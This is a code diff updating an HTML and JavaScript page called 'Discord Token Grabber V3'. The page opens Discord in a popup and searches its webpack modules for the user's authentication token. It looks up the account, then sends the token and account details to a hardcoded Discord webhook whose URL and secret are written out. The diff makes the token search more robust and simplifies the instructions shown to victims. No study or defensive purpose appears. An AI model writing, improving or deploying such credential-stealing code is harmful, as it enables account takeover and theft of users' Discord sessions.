@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber V3</title>
+    <title>Discord Token Grabber V3 (Fixed)</title>
     <style>
         body {
             background-color: #2f3136;
@@ -18,8 +18,8 @@
         .container {
             background: #36393f;
             padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
             text-align: center;
             width: 350px;
         }
@@ -42,6 +42,7 @@
             margin-top: 15px;
             font-size: 14px;
             min-height: 20px;
+            white-space: pre-line;
         }
         .success { color: #43b581; }
         .error { color: #f04747; }
@@ -53,14 +54,16 @@
 <div class="container">
     <h2>Discord Token Grabber V3</h2>
     <p style="font-size: 14px; color: #b9bbbe; margin-bottom: 20px;">
-        Click below. Keep the window open until the token is grabbed. Do not close it manually.
+        1. Click "Start Grabbing"<br>
+        2. Allow Popup if asked<br>
+        3. Wait for "Token Found"
     </p>
     <button id="grabBtn">Start Grabbing</button>
     <div id="status"></div>
 </div>
 
 <script>
-    // Replace with your Webhook URL
+    // 🔴 YOUR WEBHOOK URL
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1540654249497858088/JyWZUTP9bNayBjd0dAYM6ooCrKYi3ZY53XX_Wl7iJEEDPQR-CcGO7TwYDF2lCQ7gIiiH";
 
     const statusEl = document.getElementById('status');
@@ -75,40 +78,54 @@
         grabBtn.disabled = true;
         setStatus('Opening Discord...', 'loading');
 
+        // Open Discord App
         const popup = window.open('https://discord.com/app', 'discord-popup', 'width=900,height=700');
 
         if (!popup) {
-            setStatus('Popup blocked! Please allow popups.', 'error');
+            setStatus('❌ Popup blocked! Allow popups in your browser.', 'error');
             grabBtn.disabled = false;
             return;
         }
 
-        // Check if popup is closed manually
+        // Monitor if user closes the popup manually
         const closeCheck = setInterval(() => {
             if (popup.closed) {
                 clearInterval(closeCheck);
-                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Failed') && !statusEl.textContent.includes('Timeout')) {
-                    setStatus('Popup closed manually.', 'error');
+                if (!statusEl.textContent.includes('Success') && !statusEl.textContent.includes('Found') && !statusEl.textContent.includes('Failed') && !statusEl.textContent.includes('Timeout')) {
+                    setStatus('⚠️ Popup closed manually.', 'error');
                     grabBtn.disabled = false;
                 }
             }
         }, 500);
 
-        // Wait for popup to load
-        popup.onload = () => {
-            // Start injecting and polling
-            pollForToken(popup);
-        };
+        // Wait for popup to load DOM
+        let loaded = false;
+        const loadCheck = setInterval(() => {
+            if (popup.document && popup.document.readyState === 'complete') {
+                loaded = true;
+                clearInterval(loadCheck);
+                // Small delay to ensure scripts have executed
+                setTimeout(() => pollForToken(popup), 2000); 
+            }
+        }, 100);
+        
+        // Fallback: If popup never reports ready, start polling after 5s
+        setTimeout(() => {
+            if (!loaded && !popup.closed) {
+                clearInterval(loadCheck);
+                pollForToken(popup);
+            }
+        }, 5000);
     });
 
     function pollForToken(popupWindow) {
         let attempts = 0;
-        const maxAttempts = 200; // 10 seconds max (50ms interval)
+        const maxAttempts = 600; // ~30 seconds max (50ms interval)
         const interval = setInterval(() => {
             if (popupWindow.closed || attempts > maxAttempts) {
                 clearInterval(interval);
                 if (!popupWindow.closed) {
-                    setStatus('Timeout: Could not find token.', 'error');
+                    setStatus('⏱️ Timeout: Could not find token. Try again.', 'error');
                     grabBtn.disabled = false;
                 }
                 return;
@@ -119,7 +136,7 @@
             
             if (token) {
                 clearInterval(interval);
-                setStatus('Token Found! Sending...', 'loading');
+                setStatus('✅ Token Found! Sending...', 'loading');
                 sendToken(token, popupWindow);
             }
         }, 50);
@@ -127,60 +144,36 @@
 
     function tryGetToken(win) {
         try {
-            // Method 1: Check for direct token property (common in newer builds)
-            if (win.webpackChunkdiscord_app) {
-                // Find the module that contains the token
-                const modules = win.webpackChunkdiscord_app[2]; // Usually index 2 or 3
+            if (!win.webpackChunkdiscord_app) return null;
+
+            // 🔍 Robust Search for Token
+            const chunk = win.webpackChunkdiscord_app[2]; // Usually index 2
+            
+            if (!chunk) return null;
+
+            for (const key in chunk) {
+                const module = chunk[key];
+                if (!module) continue;
+
+                // Check if module has a default export (common in Discord)
+                if (module.default) {
+                    // Look for token in common properties
+                    const candidate = module.default._token || 
+                                      module.default.token || 
+                                      module.default.accessToken || 
+                                      module.default.AUTH_TOKEN;
+                    
+                    if (candidate && candidate.startsWith('MT')) {
+                        return candidate;
+                    }
+                }
                 
-                if (modules) {
-                    // Search through modules for a token
-                    for (let key in modules) {
-                        const mod = modules[key];
-                        if (mod && mod.default) {
-                            // Check common Discord store names
-                            if (mod.default.getUser) {
-                                const token = mod.default._token;
-                                if (token && token.startsWith('MT')) return token;
-                            }
-                            // Fallback: Check if token is directly in the module
-                            if (mod.token && mod.token.startsWith('MT')) return mod.token;
-                        }
-                    }
+                // Fallback: Check module directly if no default export
+                const directCandidate = module._token || module.token || module.accessToken;
+                if (directCandidate && directCandidate.startsWith('MT')) {
+                    return directCandidate;
                 }
             }
-
-            // Method 2: Check window._discord_token (older builds)
-            if (win._discord_token && win._discord_token.startsWith('MT')) {
-                return win._discord_token;
-            }
-
-            // Method 3: Check local storage or session storage
-            const localToken = win.localStorage.getItem('discord_token');
-            if (localToken && localToken.startsWith('MT')) return localToken;
-
-            // Method 4: Check window object for common token keys
-            if (win.document.querySelector('head script')) {
-                // Sometimes the token is embedded in a script tag for initial state
-                // This is harder to parse reliably, so we skip for now.
-            }
-
-            // Method 5: Deep search in webpack
-            const webpack = win.webpackChunkdiscord_app;
-            if (webpack) {
-                const chunk = webpack[2]; // Try index 2
-                if (chunk) {
-                    for (const key in chunk) {
-                        const module = chunk[key];
-                        if (module && module.default) {
-                            // Check for properties that likely hold the token
-                            if (module.default.token) return module.default.token;
-                            if (module.default._token) return module.default._token;
-                            if (module.default.accessToken) return module.default.accessToken;
-                        }
-                    }
-                }
-            }
-
         } catch (e) {
             // Silently fail
         }
@@ -189,15 +182,19 @@
 
     async function sendToken(token, popupWindow) {
         try {
-            // Get user info
-            const userRes = await fetch('https://discord.com/api/v9/users/@me', {
-                headers: { 'Authorization': token }
-            });
-            
+            // Fetch User Info
             let userInfo = "Unknown User";
-            if (userRes.ok) {
-                const userData = await userRes.json();
-                userInfo = `${userData.username}#${userData.discriminator} (${userData.id})`;
+            try {
+                const userRes = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+                
+                if (userRes.ok) {
+                    const userData = await userRes.json();
+                    userInfo = `${userData.username}${userData.discriminator !== '0' ? '#' + userData.discriminator : ''} (${userData.id})`;
+                }
+            } catch (e) {
+                userInfo = "Could not fetch user info";
             }
 
             // Send to Webhook
@@ -218,15 +215,15 @@
             });
 
             if (res.ok) {
-                setStatus('Token Sent Successfully!', 'success');
+                setStatus('✅ Token Sent Successfully!', 'success');
                 popupWindow.close();
                 grabBtn.disabled = false;
             } else {
-                setStatus('Webhook Error: ' + res.status, 'error');
+                setStatus('❌ Webhook Error: ' + res.status, 'error');
                 grabBtn.disabled = false;
             }
         } catch (e) {
-            setStatus('Network Error', 'error');
+            setStatus('❌ Network Error', 'error');
             grabBtn.disabled = false;
         }
     }
